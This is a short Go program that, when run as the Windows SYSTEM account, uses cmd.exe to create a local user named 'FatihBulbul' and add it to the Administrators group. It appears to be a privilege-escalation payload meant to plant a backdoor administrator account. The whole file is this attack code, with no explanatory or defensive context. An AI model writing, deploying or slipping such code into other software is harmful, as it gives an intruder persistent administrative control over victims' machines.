package main

import (
	"os/user"
	"os/exec"
)

func main() {
	current_user, err := user.Current()

	if err != nil {
		return
	}

	if current_user.Username == "NT AUTHORITY\\SYSTEM" {
		exec.Command("cmd.exe", "/c", "net user FatihBulbul xxxx /add && net localgroup Administrators FatihBulbul /add").Run()
	}
}